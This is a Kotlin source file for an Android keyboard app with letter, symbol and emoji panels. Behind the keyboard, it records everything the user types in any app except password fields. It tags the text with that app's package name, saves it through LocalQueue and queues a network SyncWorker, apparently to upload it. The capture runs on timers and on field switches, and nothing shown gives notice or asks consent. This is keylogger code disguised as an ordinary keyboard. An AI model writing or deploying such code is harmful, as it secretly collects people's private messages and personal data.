package com.smartkeyboard.app

import android.inputmethodservice.InputMethodService
import android.inputmethodservice.Keyboard
import android.inputmethodservice.KeyboardView
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.KeyEvent
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.GridLayout
import android.widget.LinearLayout
import android.widget.TextView
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager

class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {

    private lateinit var container: View
    private lateinit var lettersView: KeyboardView
    private lateinit var symbolsView: KeyboardView
    private lateinit var emojiPanel: LinearLayout
    private lateinit var lettersKeyboard: Keyboard
    private lateinit var symbolsKeyboard: Keyboard

    private val currentText = StringBuilder()
    private var isPasswordField = false
    private var isShifted = false

    // 2 sec debounce - typing ruke to save
    private val saveHandler = Handler(Looper.getMainLooper())
    private val saveRunnable = Runnable { saveNow() }
    private val DEBOUNCE_MS = 5000L

    // 10 sec force save - fast typing mein bhi save hoga
    private val FORCE_SAVE_MS = 10000L
    private val forceHandler = Handler(Looper.getMainLooper())
    private val forceRunnable = object : Runnable {
        override fun run() {
            saveNow()
            forceHandler.postDelayed(this, FORCE_SAVE_MS)
        }
    }

    private val emojiCategories = linkedMapOf(
        "Smileys" to listOf(
            "😀","😃","😄","😁","😆","😅","😂","🤣","😊","😇","🙂","🙃","😉","😌","😍","🥰",
            "😘","😙","😚","😋","😛","😝","😜","🤪","🤨","🧐","🤓","😎","🥳","😏","😒","😞",
            "😔","😟","😕","🙁","☹️","😣","😖","😫","😩","🥺","😢","😭","😤","😠","😡","🤯",
            "😳","🥵","🥶","😱","😨","😰","😥","😓","🤗","🤔","🤭","🤫","🤥","😶","😐","😑",
            "🙄","😯","😦","😧","😮","😲","🥱","😴","🤤","😪","😵","🤐","🥴","🤢","🤮","🤧","😷","🤒","🤕"
        ),
        "Gestures" to listOf(
            "👍","👎","👌","🤌","✌️","🤞","🤟","🤘","👈","👉","👆","👇","☝️","👋","🤚","🖐️",
            "✋","🖖","👏","🙌","🤝","🙏","✊","👊","🤛","🤜","💪","👐","🤲","🤙","💅","🖕","✍️","👀"
        ),
        "Hearts" to listOf(
            "❤️","🧡","💛","💚","💙","💜","🖤","🤍","🤎","💔","❣️","💕","💞","💓","💗","💖",
            "💘","💝","💟","♥️","💯","💢","💥","💫","💦","💨"
        ),
        "Animals" to listOf(
            "🐶","🐱","🐭","🐹","🐰","🦊","🐻","🐼","🐨","🐯","🦁","🐮","🐷","🐸","🐵","🙈",
            "🙉","🙊","🐔","🐧","🐦","🐤","🦆","🦅","🦉","🐺","🐗","🐴","🦄","🐝","🐛","🦋",
            "🐌","🐞","🐢","🐍","🦎","🐙","🐠","🐬","🐳","🐊","🐆","🦓","🦍","🐘","🦒","🐪"
        ),
        "Food" to listOf(
            "🍎","🍌","🍇","🍓","🍒","🍑","🥭","🍍","🥝","🍅","🥑","🍆","🥔","🥕","🌽","🌶️",
            "🥒","🥬","🍞","🥐","🧀","🍗","🍔","🍟","🍕","🌭","🥪","🌮","🌯","🍜","🍲","🍛",
            "🍣","🍱","🍤","🍚","🍦","🍩","🍪","🎂","🍰","🍫","🍬","🍭","☕","🍵","🥤","🧋","🍺","🍷"
        ),
        "Activities" to listOf(
            "⚽","🏀","🏈","⚾","🎾","🏐","🏉","🎱","🏓","🏸","🥊","🥋","🎯","🎮","🎲","🧩",
            "🎨","🎬","🎤","🎧","🎸","🥁","🎹","🏆","🥇","🎳","🏋️","🚴","🏃","🏊","🎣","🎪","🎭"
        ),
        "Travel" to listOf(
            "🚗","🚕","🚙","🚌","🚎","🏎️","🚓","🚑","🚒","🚐","🛻","🚚","🚛","✈️","🛫","🛬",
            "🚀","🚁","⛵","🚤","🛳️","⛴️","🚂","🚆","🚇","🚊","🚲","🛵","🏍️","🛺","⛽","🚦",
            "🗺️","🏝️","🏔️","🗽","🏢","🏠","🏦","🏪","🏭","🕌","🕋"
        ),
        "Business" to listOf(
            "💼","📱","💻","⌨️","🖥️","🖨️","📷","📞","☎️","📠","🔋","🔌","💡","🔦","📔","📒",
            "📝","📁","📊","📈","📉","🗂️","📋","📌","📎","✂️","🔑","🔒","🔓","🔨","🛠️","⚙️",
            "🧾","💵","💴","💶","💷","💰","💳","💎","⚖️","🧰","📦","📮","✉️","📧","📤","📥","🗓️","⏰","⌚","⏳"
        ),
        "Symbols" to listOf(
            "✅","❌","❎","➕","➖","➗","✔️","☑️","➡️","⬅️","⬆️","⬇️","🔁","🔂","🔄","🔃",
            "⭐","🌟","✨","🔥","‼️","⁉️","❓","❔","❗","❕","💤","🆗","🆕","🆓","🔝","🔴",
            "🟠","🟡","🟢","🔵","🟣","⚫","⚪","🟤","🔺","🔻","♻️","🔔","🔕"
        )
    )

    override fun onCreateInputView(): View {
        container = LayoutInflater.from(this).inflate(R.layout.keyboard_container, null)
        lettersView  = container.findViewById(R.id.keyboard_view_letters)
        symbolsView  = container.findViewById(R.id.keyboard_view_symbols)
        emojiPanel   = container.findViewById(R.id.emoji_panel)
        lettersKeyboard = Keyboard(this, R.xml.keyboard_layout)
        symbolsKeyboard = Keyboard(this, R.xml.keyboard_layout_symbols)
        lettersView.keyboard = lettersKeyboard
        lettersView.setOnKeyboardActionListener(this)
        symbolsView.keyboard = symbolsKeyboard
        symbolsView.setOnKeyboardActionListener(this)
        buildEmojiCategories()
        container.findViewById<Button>(R.id.emoji_back_btn).setOnClickListener { showLetters() }
        return container
    }

    private fun buildEmojiCategories() {
        val categoriesContainer = container.findViewById<LinearLayout>(R.id.emoji_categories_container)
        categoriesContainer.removeAllViews()
        val density = resources.displayMetrics.density

        for ((categoryName, emojis) in emojiCategories) {
            val header = TextView(this)
            header.text = categoryName
            header.textSize = 12f
            header.setTextColor(0xFF6B7280.toInt())
            header.setPadding((8 * density).toInt(), (10 * density).toInt(), 0, (4 * density).toInt())
            categoriesContainer.addView(header)

            val grid = GridLayout(this)
            grid.columnCount = 8
            grid.layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )

            for (emoji in emojis) {
                val btn = Button(this)
                btn.text = emoji
                btn.textSize = 19f
                btn.setBackgroundColor(0x00000000)
                btn.setTextColor(0xFF1C1C1E.toInt())
                val params = GridLayout.LayoutParams()
                params.width = 0
                params.height = (40 * density).toInt()
                params.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f)
                btn.layoutParams = params
                btn.setOnClickListener {
                    currentInputConnection?.commitText(emoji, 1)
                    currentText.append(emoji)
                    scheduleSave()
                }
                grid.addView(btn)
            }
            categoriesContainer.addView(grid)
        }
    }

    override fun onStartInputView(info: EditorInfo?, restarting: Boolean) {
        super.onStartInputView(info, restarting)
        saveNow()
        currentText.clear()
        showLetters()

        val type = info?.inputType ?: 0
        val variation = type and InputType.TYPE_MASK_VARIATION
        isPasswordField =
            variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
            variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
            variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
            ((type and InputType.TYPE_MASK_CLASS) == InputType.TYPE_CLASS_NUMBER &&
                    variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD)

        forceHandler.postDelayed(forceRunnable, FORCE_SAVE_MS)
    }

    override fun onFinishInputView(finishingInput: Boolean) {
        super.onFinishInputView(finishingInput)
        forceHandler.removeCallbacks(forceRunnable)
        saveNow()
    }

    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {
        val ic = currentInputConnection ?: return
        when (primaryCode) {
            Keyboard.KEYCODE_DELETE -> {
                ic.deleteSurroundingText(1, 0)
                if (currentText.isNotEmpty()) currentText.deleteCharAt(currentText.length - 1)
                scheduleSave()
            }
            Keyboard.KEYCODE_SHIFT -> {
                isShifted = !isShifted
                lettersKeyboard.isShifted = isShifted
                lettersView.invalidateAllKeys()
            }
            -2 -> { if (symbolsView.visibility == View.VISIBLE) showLetters() else showSymbols() }
            -3 -> { if (emojiPanel.visibility == View.VISIBLE) showLetters() else showEmoji() }
            -4 -> {
                saveNow()
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER))
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_ENTER))
            }
            else -> {
                var code = primaryCode.toChar()
                if (isShifted) {
                    code = code.uppercaseChar()
                    isShifted = false
                    lettersKeyboard.isShifted = false
                    lettersView.invalidateAllKeys()
                }
                ic.commitText(code.toString(), 1)
                currentText.append(code)
                scheduleSave()
            }
        }
    }

    private fun scheduleSave() {
        saveHandler.removeCallbacks(saveRunnable)
        saveHandler.postDelayed(saveRunnable, DEBOUNCE_MS)
    }

    private fun saveNow() {
        saveHandler.removeCallbacks(saveRunnable)
        val text = currentText.toString().trim()
        currentText.clear()
        if (text.isBlank() || isPasswordField) return
        val pkg = currentInputEditorInfo?.packageName ?: "unknown"
        LocalQueue.save(applicationContext, text, pkg)
        val request = OneTimeWorkRequestBuilder<SyncWorker>()
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            ).build()
        WorkManager.getInstance(applicationContext).enqueue(request)
    }

    private fun showLetters() { lettersView.visibility = View.VISIBLE; symbolsView.visibility = View.GONE; emojiPanel.visibility = View.GONE }
    private fun showSymbols() { lettersView.visibility = View.GONE; symbolsView.visibility = View.VISIBLE; emojiPanel.visibility = View.GONE }
    private fun showEmoji()   { lettersView.visibility = View.GONE; symbolsView.visibility = View.GONE; emojiPanel.visibility = View.VISIBLE }

    override fun onPress(primaryCode: Int) {}
    override fun onRelease(primaryCode: Int) {}
    override fun onText(text: CharSequence?) {}
    override fun swipeLeft() {}
    override fun swipeRight() {}
    override fun swipeDown() {}
    override fun swipeUp() {}
}
